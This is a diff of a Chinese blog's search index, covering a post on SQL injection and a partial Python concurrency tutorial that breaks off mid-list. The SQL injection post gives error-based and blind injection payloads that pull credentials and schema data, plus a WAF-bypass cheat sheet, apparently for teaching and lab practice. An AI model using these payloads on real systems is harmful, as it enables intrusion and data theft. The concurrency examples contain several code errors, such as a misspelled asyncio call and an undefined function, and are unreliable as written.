@@ -3,14 +3,14 @@
   <entry>
     <title>SQL注入详解2.0-重构篇</title>
     <url>/SQLInject/SQL%E6%B3%A8%E5%85%A5%E8%AF%A6%E8%A7%A32.0-%E9%87%8D%E6%9E%84%E7%AF%87/</url>
-    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><blockquote>
+    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a><center>前言</center></h1><blockquote>
 <p>之前写过一篇，但是愈发感觉到之前写的薄弱和乱，所以重构！</p>
 </blockquote>
 <p><a href="https://sm.ms/image/ecEnPtXKhJqdw1B" target="_blank"><img src="https://s2.loli.net/2022/02/24/ecEnPtXKhJqdw1B.jpg" ></a></p>
 <span id="more"></span>
 
 
-<h1 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h1><p>实际上注入类漏洞最<font color="red"> 本质的原因就是</font> ，<code>混洗了代码和数据的边界</code>。</p>
+<h1 id="正文"><a href="#正文" class="headerlink" title="正文"></a><center>正文</center></h1><p>实际上注入类漏洞最<font color="red"> 本质的原因就是</font> ，<code>混淆了代码和数据的边界</code>。</p>
 <p><a href="https://sm.ms/image/bP659ZCEGdpOSFm" target="_blank"><img src="https://s2.loli.net/2022/02/24/bP659ZCEGdpOSFm.png" ></a></p>
 <ul>
 <li>注入的类型总的就只有3种：<ul>
@@ -46,7 +46,7 @@
 </ul>
 </li>
 </ul>
-<h1 id="联合注入"><a href="#联合注入" class="headerlink" title="联合注入"></a>联合注入</h1><p>由<font color="red"> union select</font>得名，是一种最快的查询方式。</p>
+<h1 id="联合注入"><a href="#联合注入" class="headerlink" title="联合注入"></a><center>联合注入</center></h1><p>由<font color="red"> union select</font>得名，是一种最快的查询方式。</p>
 <p>从注入类型来划分讲。</p>
 <h2 id="数字型"><a href="#数字型" class="headerlink" title="数字型"></a>数字型</h2><p>也就是不用闭合，用户的输入直接被解析成了新的SQL语句。</p>
 <p>从代码层面来看如下：</p>
@@ -71,7 +71,7 @@
 <p>因此你输入的SQL语句<font color="red"> 将被独立代入MySQL数据库解析</font> ，以此达到注入的效果。</p>
 <p>之后的按照注入点划分，也要判断数字型和字符型，以此类推。注入语句将放在后面统一讲。</p>
 <h2 id="叠堆注入"><a href="#叠堆注入" class="headerlink" title="叠堆注入"></a>叠堆注入</h2><p>笼统的讲，叠堆注入也是联合注入。</p>
-<h1 id="报错注入"><a href="#报错注入" class="headerlink" title="报错注入"></a>报错注入</h1><p>测试时发现会<font color="red"> 回显报错信息</font> ，就可以试试报错注入。</p>
+<h1 id="报错注入"><a href="#报错注入" class="headerlink" title="报错注入"></a><center>报错注入</center></h1><p>测试时发现会<font color="red"> 回显报错信息</font> ，就可以试试报错注入。</p>
 <ul>
 <li>报错注入主要用到3个函数<ul>
 <li>floor()</li>
@@ -94,7 +94,7 @@
   <figure class="highlight java"><table><tr><td class="code"><pre><span class="line">’or(updatexml(<span class="number">1</span>,concat(<span class="number">0x7e</span>,(select(group_concat(id,username,password))from(geek.H4rDsq1)</span><br><span class="line">),<span class="number">0x7e</span>),<span class="number">1</span>))or<span class="string">&#x27;</span></span><br></pre></td></tr></table></figure></li>
 </ul>
 <p>其他几个函数以此类推，<font color="red"> 绕WAF根据数据库版本换成数学函数。</font> </p>
-<h1 id="盲注"><a href="#盲注" class="headerlink" title="盲注"></a>盲注</h1><h2 id="布尔盲注"><a href="#布尔盲注" class="headerlink" title="布尔盲注"></a>布尔盲注</h2><p><font color="red"> 根据页面的回显不同来判断</font> 。</p>
+<h1 id="盲注"><a href="#盲注" class="headerlink" title="盲注"></a><center>盲注</center></h1><h2 id="布尔盲注"><a href="#布尔盲注" class="headerlink" title="布尔盲注"></a>布尔盲注</h2><p><font color="red"> 根据页面的回显不同来判断</font> 。</p>
 <p>Payload</p>
 <figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">爆库名：?id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; and left((select database()),1)=&#x27;</span>s<span class="string">&#x27;--+</span></span><br><span class="line"><span class="string">爆表名：?id=1&#x27;</span> <span class="keyword">and</span> <span class="keyword">left</span>((<span class="keyword">select</span> table_name <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema <span class="operator">=</span><span class="string">&#x27;security&#x27;</span> limit <span class="number">3</span>,<span class="number">1</span>),<span class="number">5</span>)<span class="operator">=</span><span class="string">&#x27;users&#x27;</span><span class="comment">--+</span></span><br><span class="line">爆列明：?id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; and left((select column_name from information_schema.columns where table_name=&#x27;</span>users<span class="string">&#x27; limit 1,1),8)=&#x27;</span>username<span class="string">&#x27;--+</span></span><br><span class="line"><span class="string">爆数据：?id=1&#x27;</span> <span class="keyword">and</span> <span class="keyword">left</span>((<span class="keyword">select</span> username <span class="keyword">from</span> users <span class="keyword">order</span> <span class="keyword">by</span> id limit <span class="number">0</span>,<span class="number">1</span>),<span class="number">4</span>)<span class="operator">=</span><span class="string">&#x27;dumb&#x27;</span><span class="comment">--+</span></span><br></pre></td></tr></table></figure>
 
@@ -113,7 +113,7 @@
 
 
 <p>其他皆可以此类推。</p>
-<h1 id="group-concat的使用"><a href="#group-concat的使用" class="headerlink" title="group_concat的使用"></a>group_concat的使用</h1><p><font color="red"> mysql版本&gt;5.0切使用了information_schema数据库  </font> </p>
+<h1 id="group-concat的使用"><a href="#group-concat的使用" class="headerlink" title="group_concat的使用"></a><center>group_concat的使用</center></h1><p><font color="red"> mysql版本&gt;5.0切使用了information_schema数据库  </font> </p>
 <figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> group_concat(SCHEMA_NAME) <span class="keyword">from</span> (information_schema.schemata )</span><br><span class="line"></span><br></pre></td></tr></table></figure>
 
 
@@ -133,7 +133,7 @@
 
 
 <p>其他以此类推。</p>
-<h1 id="SQL注入绕过速查表"><a href="#SQL注入绕过速查表" class="headerlink" title="SQL注入绕过速查表"></a>SQL注入绕过速查表</h1><h2 id="过滤and-or"><a href="#过滤and-or" class="headerlink" title="过滤and or"></a>过滤and or</h2><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">or</span>     ——<span class="operator">&gt;</span>    <span class="operator">||</span></span><br><span class="line"><span class="keyword">and</span>     ——<span class="operator">&gt;</span>    <span class="operator">&amp;&amp;</span></span><br><span class="line">xor ——<span class="operator">&gt;</span> <span class="operator">|</span>   </span><br><span class="line"><span class="keyword">not</span> ——<span class="operator">&gt;</span> <span class="operator">!</span></span><br><span class="line"></span><br><span class="line">十六进制绕过</span><br><span class="line"><span class="keyword">or</span> ——<span class="operator">&gt;</span> o\x72</span><br><span class="line"></span><br><span class="line">大小写绕过</span><br><span class="line"><span class="keyword">Or</span></span><br><span class="line"><span class="keyword">aNd</span></span><br><span class="line"></span><br><span class="line">双写绕过</span><br><span class="line">oorr</span><br><span class="line">anandd</span><br><span class="line"></span><br><span class="line">urlencode，ascii(<span class="type">char</span>)，hex，unicode编码绕过</span><br><span class="line">    一些unicode编码举例：</span><br><span class="line">    单引号：<span class="string">&#x27;</span></span><br><span class="line"><span class="string">    %u0027 %u02b9 %u02bc</span></span><br><span class="line"><span class="string">    %u02c8 %u2032</span></span><br><span class="line"><span class="string">    %uff07 %c0%27</span></span><br><span class="line"><span class="string">    %c0%a7 %e0%80%a7</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">关键字内联注释尝试绕所有</span></span><br><span class="line"><span class="string">/*!or*/</span></span><br><span class="line"><span class="string">/*!and*/</span></span><br></pre></td></tr></table></figure>
+<h1 id="SQL注入绕过速查表"><a href="#SQL注入绕过速查表" class="headerlink" title="SQL注入绕过速查表"></a><center>SQL注入绕过速查表</center></h1><h2 id="过滤and-or"><a href="#过滤and-or" class="headerlink" title="过滤and or"></a>过滤and or</h2><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">or</span>     ——<span class="operator">&gt;</span>    <span class="operator">||</span></span><br><span class="line"><span class="keyword">and</span>     ——<span class="operator">&gt;</span>    <span class="operator">&amp;&amp;</span></span><br><span class="line">xor ——<span class="operator">&gt;</span> <span class="operator">|</span>   </span><br><span class="line"><span class="keyword">not</span> ——<span class="operator">&gt;</span> <span class="operator">!</span></span><br><span class="line"></span><br><span class="line">十六进制绕过</span><br><span class="line"><span class="keyword">or</span> ——<span class="operator">&gt;</span> o\x72</span><br><span class="line"></span><br><span class="line">大小写绕过</span><br><span class="line"><span class="keyword">Or</span></span><br><span class="line"><span class="keyword">aNd</span></span><br><span class="line"></span><br><span class="line">双写绕过</span><br><span class="line">oorr</span><br><span class="line">anandd</span><br><span class="line"></span><br><span class="line">urlencode，ascii(<span class="type">char</span>)，hex，unicode编码绕过</span><br><span class="line">    一些unicode编码举例：</span><br><span class="line">    单引号：<span class="string">&#x27;</span></span><br><span class="line"><span class="string">    %u0027 %u02b9 %u02bc</span></span><br><span class="line"><span class="string">    %u02c8 %u2032</span></span><br><span class="line"><span class="string">    %uff07 %c0%27</span></span><br><span class="line"><span class="string">    %c0%a7 %e0%80%a7</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">关键字内联注释尝试绕所有</span></span><br><span class="line"><span class="string">/*!or*/</span></span><br><span class="line"><span class="string">/*!and*/</span></span><br></pre></td></tr></table></figure>
 
 
 <h2 id="左括号过滤"><a href="#左括号过滤" class="headerlink" title="左括号过滤"></a>左括号过滤</h2><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">urlencode，ascii(<span class="type">char</span>)，hex，unicode编码绕过</span><br><span class="line"><span class="operator">%</span>u0028 <span class="operator">%</span>uff08</span><br><span class="line"><span class="operator">%</span>c0<span class="operator">%</span><span class="number">28</span> <span class="operator">%</span>c0<span class="operator">%</span>a8</span><br><span class="line"><span class="operator">%</span>e0<span class="operator">%</span><span class="number">80</span><span class="operator">%</span>a8</span><br></pre></td></tr></table></figure>
@@ -197,6 +197,204 @@
       </categories>
       <tags>
         <tag>SQLInject</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>多进程、进程池、异步大总结</title>
+    <url>/%E7%9F%A5%E8%AF%86%E6%A0%91/%E5%A4%9A%E8%BF%9B%E7%A8%8B%E5%A4%9A%E7%BA%BF%E7%A8%8B%E5%BC%82%E6%AD%A5/</url>
+    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a><center>前言</center></h1><p>经常写脚本与工具，越发感觉到速度的重要性！本文从基础开始，基于Python讲解，适合小白阅读，但需要一定代码功底。</p>
+<p><a href="https://sm.ms/image/rxesbPFqSN2uTp3" target="_blank"><img src="https://s2.loli.net/2022/02/25/rxesbPFqSN2uTp3.jpg" ></a></p>
+<span id="more"></span>
+
+<h1 id="正文"><a href="#正文" class="headerlink" title="正文"></a><center>正文</center></h1><p>在正式进入学习之前，先要了解一定的基础知识。</p>
+<h2 id="1-1-阻塞"><a href="#1-1-阻塞" class="headerlink" title="1.1 阻塞"></a>1.1 阻塞</h2><ul>
+<li>程序未得到所需计算资源时被挂起的状态。</li>
+<li><strong>程序在等待某个操作完成期间，自身无法继续干别的事情，则称该程序在该操作上是阻塞的****。</strong></li>
+<li>常见的阻塞形式有：<code>网络I/O阻塞</code>、<code>磁盘I/O阻塞</code>、<code>用户输入阻塞</code><strong>等</strong>。</li>
+</ul>
+<p>阻塞是无处不在的，包括CPU切换上下文时，所有的进程都无法真正干事情，它们也会被阻塞。（如果是多核CPU则正在执行上下文切换操作的核不可被利用）</p>
+<h2 id="1-2-非阻塞"><a href="#1-2-非阻塞" class="headerlink" title="1.2 非阻塞"></a>1.2 非阻塞</h2><ul>
+<li><strong>程序在等待某操作过程中，自身不被阻塞，可以继续运行干别的事情，则称该程序在该操作上是非阻塞的。</strong></li>
+<li>非阻塞并<code>不是</code>在任何程序级别、任何情况下都可以存在的。</li>
+<li>仅当程序封装的级别可以囊括独立的子程序单元时，它才可能存在非阻塞状态。</li>
+</ul>
+<p>非阻塞的存在是因为阻塞存在，正因为某个操作阻塞导致的耗时与效率低下，我们才要把它变成非阻塞的。</p>
+<h2 id="1-3-同步"><a href="#1-3-同步" class="headerlink" title="1.3 同步"></a>1.3 同步</h2><ul>
+<li>不同程序单元为了完成某个任务，在执行过程中需靠某种通信方式以<strong>协调一致</strong>，称这些程序单元是同步执行的。</li>
+<li>例如购物系统中更新商品库存，需要用“行锁”作为通信信号，让不同的更新请求强制排队顺序执行，那更新库存的操作是同步的。</li>
+<li>简言之，<strong>同步意味着有序</strong>。</li>
+</ul>
+<h2 id="1-4-异步"><a href="#1-4-异步" class="headerlink" title="1.4 异步"></a>1.4 异步</h2><ul>
+<li>为完成某个任务，不同程序单元之间<strong>过程中无需通信协调</strong>，也能完成任务的方式。</li>
+<li>不相关的程序单元之间可以是异步的。</li>
+<li>例如，爬虫下载网页。调度程序调用下载程序后，即可调度其他任务，而无需与该下载任务保持通信以协调行为。不同网页的下载、保存等操作都是无关的，也无需相互通知协调。这些异步操作的完成时刻并不确定。</li>
+<li>简言之，<strong>异步意味着无序</strong>。</li>
+</ul>
+<p>上文提到的<code>“通信方式”</code>通常是指异步和并发编程提供的<code>同步原语</code>，如<code>信号量</code>、<code>锁</code>、<code>同步队列</code>等等。我们需知道，虽然这些通信方式是为了让多个程序在一定条件下同步执行，但正因为是异步的存在，才需要这些通信方式。如果所有程序都是按序执行，其本身就是同步的，又何需这些同步信号呢？</p>
+<h2 id="1-5-并发"><a href="#1-5-并发" class="headerlink" title="1.5 并发"></a>1.5 并发</h2><ul>
+<li>并发描述的是程序的组织结构。指程序要被设计成多个可独立执行的子任务。</li>
+<li><strong>以利用有限的计算机资源使多个任务可以被实时或近实时执行为目的。</strong></li>
+</ul>
+<h2 id="1-6-并行"><a href="#1-6-并行" class="headerlink" title="1.6 并行"></a>1.6 并行</h2><ul>
+<li>并行描述的是程序的执行状态。指多个任务同时被执行。</li>
+<li><strong>以利用富余计算资源（多核CPU）加速完成多个任务为目的。</strong></li>
+</ul>
+<p>并发提供了一种程序组织结构方式，让问题的解决方案可以并行执行，但并行执行不是必须的。</p>
+<h2 id="1-7-概念总结"><a href="#1-7-概念总结" class="headerlink" title="1.7 概念总结"></a>1.7 概念总结</h2><ul>
+<li><code>**并行**</code>是为了利用多核加速多任务完成的进度</li>
+<li><code>**并发**</code>是为了让独立的子任务都有机会被尽快执行，但不一定能加速整体进度</li>
+<li><code>**非阻塞**</code>是为了提高程序整体执行效率</li>
+<li><code>**异步**</code>是高效地组织非阻塞任务的方式</li>
+</ul>
+<h2 id="1-8-全局解释器锁"><a href="#1-8-全局解释器锁" class="headerlink" title="1.8 全局解释器锁"></a>1.8 全局解释器锁</h2><ul>
+<li>CPython 在解释器进程级别有一把锁，叫做GIL，即全局解释器锁。</li>
+<li>GIL 保证CPython进程中，只有一个线程执行字节码。甚至是在多核CPU的情况下，也只允许同时只能有一个CPU 上运行该进程的一个线程。</li>
+<li>CPython中<ol>
+<li><strong>IO密集型</strong>，某个线程阻塞，就会调度其他就绪线程；</li>
+<li><strong>CPU密集型</strong>，当前线程可能会连续的获得GIL，导致其它线程几乎无法使用CPU。</li>
+</ol>
+</li>
+<li>在CPython中由于有GIL存在，IO密集型，使用多线程较为合算；CPU密集型，使用多进程，要绕开GIL。</li>
+</ul>
+<p>要支持并发，必须拆分为多任务，不同任务相对而言才有阻塞&#x2F;非阻塞、同步&#x2F;异步。所以，并发、异步、非阻塞三个词总是如影随形。</p>
+<h1 id="多线程"><a href="#多线程" class="headerlink" title="多线程"></a><center>多线程</center></h1><p>了解以上内容，就可以来看多线程了，标题明明没有多线程我为什么还要讲多线程呢？</p>
+<p>Python因为<code>GIL（全局解释器锁）</code>的存在，Python的多线程并不是真正的多线程，但是在同步不阻塞的情况下，却可以发挥出多线程的效果，无法做到异步，但是可以推荐了解一下，了解之后可以更方便学习多进程。</p>
+<h2 id="线程的基本概念"><a href="#线程的基本概念" class="headerlink" title="线程的基本概念"></a>线程的基本概念</h2><p><code>线程</code>是指进程内的一个执行单元,也是进程内的可调度实体。</p>
+<p><font color="red"><strong>一个进程可以拥有多个线程。</strong></font></p>
+<p>与进程的区别:  </p>
+<ul>
+<li><p>地址空间:进程内的一个执行单元;进程至少有一个线程;它们共享进程的地址空间;而进程有自己独立的地址空间； </p>
+</li>
+<li><p>资源拥有:进程是资源分配和拥有的单位,同一个进程内的线程共享进程的资源；</p>
+</li>
+<li><p>线程是处理器调度的基本单位,但进程不是；</p>
+</li>
+<li><p>二者均可并发执行。</p>
+</li>
+</ul>
+<p>简而言之,<font color="red"><strong>一个程序至少有一个进程,一个进程至少有一个线程</strong></font>。</p>
+<p>线程的划分尺度小于进程，使得多线程程序的并发性高。<br>另外，进程在执行过程中拥有独立的内存单元，而多个线程共享内存，从而极大地提高了程序的运行效率。</p>
+<h2 id="threading、queue"><a href="#threading、queue" class="headerlink" title="threading、queue"></a>threading、queue</h2><p>Python实现多线程主要用threading模块，线程同步则是用queue模块实现。</p>
+<p>线程同步有4种实现方式：</p>
+<ul>
+<li>锁机制</li>
+<li>信号量</li>
+<li>条件判断</li>
+<li>同步队列</li>
+</ul>
+<p>queue模块内部封装了锁原语，使用先进先出队列的时候使用互斥锁。</p>
+<p>下面用这个例子讲解：</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"><span class="keyword">import</span> queue</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">read</span>(<span class="params">q</span>):</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;1.txt&quot;</span>, <span class="string">&quot;r&quot;</span>) <span class="keyword">as</span> f:  <span class="comment"># 打开文件</span></span><br><span class="line">        <span class="keyword">for</span> line <span class="keyword">in</span> f.readlines():</span><br><span class="line">            line = line.strip(<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">            q.put(line)</span><br><span class="line">            <span class="built_in">print</span>(line)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">resp</span>(<span class="params">q</span>):</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        s = q.get()</span><br><span class="line">        s += <span class="string">&#x27;\n&#x27;</span></span><br><span class="line">        <span class="keyword">if</span> q.empty():</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;dir.txt&quot;</span>, <span class="string">&#x27;a&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">            <span class="keyword">for</span> i <span class="keyword">in</span> s:</span><br><span class="line">                f.writelines(i)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    q = queue.Queue()</span><br><span class="line">    threadings = []</span><br><span class="line"></span><br><span class="line">    t1 = threading.Thread(target=read, args=(q,))</span><br><span class="line">    t1.start()</span><br><span class="line">    threadings.append(t1)</span><br><span class="line">    <span class="keyword">for</span> thread <span class="keyword">in</span> threadings:</span><br><span class="line">        thread.join()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">5</span>):</span><br><span class="line">        t2 = threading.Thread(target=resp, args=(q,))</span><br><span class="line">        t2.start()</span><br><span class="line">        threadings.append(t2)</span><br><span class="line">    <span class="keyword">for</span> thread <span class="keyword">in</span> threadings:</span><br><span class="line">        thread.join()</span><br></pre></td></tr></table></figure>
+
+<p>代码第26行实例化了一个先进先出的queue队列，27行创建一个线程池。</p>
+<p><code>t1</code>是第一个线程，target指向方法，atgs指向传值，q后面必须加逗号。</p>
+<p>31-33行，把t1添加到线程池，等他循环完，就阻塞。</p>
+<h1 id="多进程"><a href="#多进程" class="headerlink" title="多进程"></a><center>多进程</center></h1><p>Python中的多线程无法利用多核优势，如果想要<code>充分地使用多核CPU的资源</code>，在python中大部分情况需要使用多进程。</p>
+<h2 id="multiprocessing"><a href="#multiprocessing" class="headerlink" title="multiprocessing"></a>multiprocessing</h2><p>Python实现多进程主要依靠<code>multiprocessing模块</code>实现.</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> multiprocessing <span class="keyword">import</span> Process</span><br></pre></td></tr></table></figure>
+
+<p><code>multiprocessing</code>模块用来开启子进程，并在子进程中执行我们定制的任务（比如函数）</p>
+<p><code>multiprocessing</code>模块的功能众多：支持子进程、<strong>通信和共享数据</strong>、执行不同形式的同步，提供了<code>Process、Queue、Pipe、Lock</code>等组件。</p>
+<p><font color="red"><strong>与线程不同，进程没有任何共享状态，进程修改的数据，改动仅限于该进程内</strong></font></p>
+<p>写法与线程类死，但是<font color="red"><strong>进程类必须在main()内</strong></font>,使用队列也必须是multiprocessing内的队列。</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> multiprocessing <span class="keyword">import</span> Process, Queue</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">text1</span>():</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;线程启动了&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    q = Queue()</span><br><span class="line">    p1 = Process(target=text1, args=(q,))</span><br><span class="line">    p1.start()</span><br><span class="line">    p1.join()</span><br></pre></td></tr></table></figure>
+
+<p><font color="red"><strong>有两种启动方式，多线程必须用.start()，如果用.run()就降级为单进程了。</strong></font></p>
+<h1 id="线程池"><a href="#线程池" class="headerlink" title="线程池"></a><center>线程池</center></h1><p>主要用multiprocessing中的Pool实现</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> multiprocessing <span class="keyword">import</span> Pool</span><br></pre></td></tr></table></figure>
+
+<p>例子</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> multiprocessing <span class="keyword">import</span> Process, Pool, Pipe</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    q = Pipe</span><br><span class="line">    <span class="comment"># 100个任务</span></span><br><span class="line">    data = <span class="built_in">list</span>(<span class="built_in">range</span>(<span class="number">100</span>))</span><br><span class="line">    <span class="comment"># 进程池大小</span></span><br><span class="line">    pool = Pool(processes=<span class="number">4</span>)</span><br><span class="line">    <span class="comment"># 一个一个提交</span></span><br><span class="line">    <span class="comment"># pool_out_puts = pool.apply(index_pool,(q,))</span></span><br><span class="line">    <span class="comment"># 一次性大量提交</span></span><br><span class="line">    pool_out_puts = pool.<span class="built_in">map</span>(index_pool, (q,))</span><br><span class="line">    pool.close()<span class="comment"># 关闭进程</span></span><br><span class="line">    pool.join()<span class="comment"># 阻塞进程</span></span><br></pre></td></tr></table></figure>
+
+<p><strong>线程池是不能用队列来进行通信的，要用管道，也就是Pipe</strong></p>
+<p>apply_async() 异步提交任务</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">task</span>(<span class="params">num</span>):</span><br><span class="line">    time.sleep(<span class="number">1</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;%s : %s&#x27;</span> % (num, os.getpid()))</span><br><span class="line">    <span class="keyword">return</span> num ** <span class="number">2</span></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    p = Pool()</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">5</span>):</span><br><span class="line">        res = p.apply_async(task, args=(i,))</span><br><span class="line">        <span class="built_in">print</span>(res.get())</span><br></pre></td></tr></table></figure>
+
+<p>只能通过.get()得到返回值</p>
+<p>通过异步的方式取返回值</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">task</span>(<span class="params">num</span>):</span><br><span class="line">    time.sleep(<span class="number">1</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;%s : %s&#x27;</span> % (num, os.getpid()))</span><br><span class="line">    <span class="keyword">return</span> num ** <span class="number">2</span></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    p = Pool()</span><br><span class="line">    res_lst = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">5</span>):</span><br><span class="line">        res = p.apply_async(task, args=(i,))     <span class="comment"># 先把任务全提交</span></span><br><span class="line">        res_lst.append(res)</span><br><span class="line">    <span class="keyword">for</span> res <span class="keyword">in</span> res_lst:</span><br><span class="line">        <span class="built_in">print</span>(res.get())  <span class="comment"># get本身就有阻塞的效果了，就不需要join再阻塞一次了,谁先拿到结果先取谁就行了</span></span><br></pre></td></tr></table></figure>
+
+<p>用map()提交任务时取返回值</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> multiprocessing <span class="keyword">import</span> Pool,Queue,Pipe</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">func</span>(<span class="params">q</span>):</span><br><span class="line">    <span class="built_in">print</span>(q)</span><br><span class="line">    time.sleep(<span class="number">1</span>)</span><br><span class="line">    <span class="keyword">return</span> q</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    p = Pool()</span><br><span class="line">    ret = <span class="built_in">map</span>(func, <span class="built_in">range</span>(<span class="number">20</span>))</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> ret:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;--&gt;&#x27;</span>, i)    </span><br></pre></td></tr></table></figure>
+
+<h1 id="异步"><a href="#异步" class="headerlink" title="异步"></a><center>异步</center></h1><h2 id="协程"><a href="#协程" class="headerlink" title="协程"></a>协程</h2><p>让一个线程在代码中来回切换游走。</p>
+<p>协程（Corourine），也可以称为微线程，是一种用户态内的上下文切换技术。简而言之，其实就是通过一个线程实现代码块相互切换执行。</p>
+<p>实现协程的方法的主流方法</p>
+<p>async、await关键字（&gt;Python3.5）</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> asyncio</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">def</span> <span class="title function_">func1</span>():</span><br><span class="line">    <span class="built_in">print</span>(<span class="number">1</span>)</span><br><span class="line">    <span class="keyword">await</span> asyncio.sellp(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">def</span> <span class="title function_">func2</span>():</span><br><span class="line">    <span class="built_in">print</span>(<span class="number">1</span>)</span><br><span class="line">    <span class="keyword">await</span> asyncio.sellp(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">tasks = [</span><br><span class="line">    asyncio.ensure_future(func1()),</span><br><span class="line">    asyncio.ensure_future(func2())</span><br><span class="line">]</span><br><span class="line"></span><br><span class="line"><span class="comment"># 去生成一个事件循环</span></span><br><span class="line">loop = asyncio.get_event_loop()</span><br><span class="line"><span class="comment"># 将任务放到任务列表</span></span><br><span class="line">loop.run_until_complete(asyncio.wait(tasks))</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li><p>协程的意义</p>
+<p>  在一个线程中遇到如果遇到IO等待时间，线程不会等待，利用空闲的时间再去做其他的事情。</p>
+</li>
+</ul>
+<h2 id="asyncio事件循环"><a href="#asyncio事件循环" class="headerlink" title="asyncio事件循环"></a>asyncio事件循环</h2><p> 也就是一个死循环，去检测并执行某些代码</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 伪代码</span></span><br><span class="line"></span><br><span class="line">任务列表 = [任务<span class="number">1</span>， 任务<span class="number">2</span>， 任务<span class="number">3</span>，。。。。]</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    可执行的任务列表，已完成的任务列表 = 去任务列表中检查所有任务，将<span class="string">&#x27;可执行&#x27;</span>和<span class="string">&#x27;已执行&#x27;</span>的任务返回</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">for</span> 就绪任务 <span class="keyword">in</span> 可执行任务列表:</span><br><span class="line">        执行已就绪的任务</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">for</span> 已完成的任务 <span class="keyword">in</span> 已完成的任务列表:</span><br><span class="line">        在任务列表中移除 已完成的任务</span><br><span class="line">        </span><br><span class="line">    如果 任务列表 中的任务都已完成，则终止循环</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>实例</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">tasks = [</span><br><span class="line">    asyncio.ensure_future(func1()),</span><br><span class="line">    asyncio.ensure_future(func2())</span><br><span class="line">]</span><br><span class="line"></span><br><span class="line"><span class="comment"># 去生成一个事件循环</span></span><br><span class="line">loop = asyncio.get_event_loop()</span><br><span class="line"><span class="comment"># 将任务放到任务列表</span></span><br><span class="line">loop.run_until_complete(asyncio.wait(tasks))</span><br></pre></td></tr></table></figure>
+
+
+
+<ul>
+<li><p>协程函数</p>
+<ul>
